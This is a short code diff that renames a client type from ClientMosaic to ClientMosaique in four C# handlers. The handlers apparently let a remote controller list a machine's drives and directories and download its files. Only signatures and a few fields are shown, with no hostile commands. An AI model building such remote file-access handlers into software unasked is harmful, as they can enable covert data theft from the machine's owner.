@@ -15,7 +15,7 @@ namespace Client.Controllers
         private const string DELIMITER = "$E$";
         private static readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads
         private static Dictionary<int, string> _canceledDownloads = new Dictionary<int, string>();
-        public static void getDrives(GetDrives command, ClientMosaic client)
+        public static void getDrives(GetDrives command, ClientMosaique client)
         {
             DriveInfo[] drives;
             try
@@ -83,7 +83,7 @@ namespace Client.Controllers
             }
         }
 
-        public static void getDirectory(GetDirectory command, ClientMosaic client)
+        public static void getDirectory(GetDirectory command, ClientMosaique client)
         {
             bool isError = false;
             string message = null;
@@ -169,7 +169,7 @@ namespace Client.Controllers
             }
         }
 
-        public static void doDownloadFile(DoDownloadFile command, ClientMosaic client)
+        public static void doDownloadFile(DoDownloadFile command, ClientMosaique client)
         {
             new Thread(() =>
             {
@@ -205,7 +205,7 @@ namespace Client.Controllers
             }).Start();
         }
 
-        public static void doDownloadFileCancel(DoDownloadFileCancel packet, ClientMosaic client)
+        public static void doDownloadFileCancel(DoDownloadFileCancel packet, ClientMosaique client)
         {
             if (!_canceledDownloads.ContainsKey(packet.id))
             {
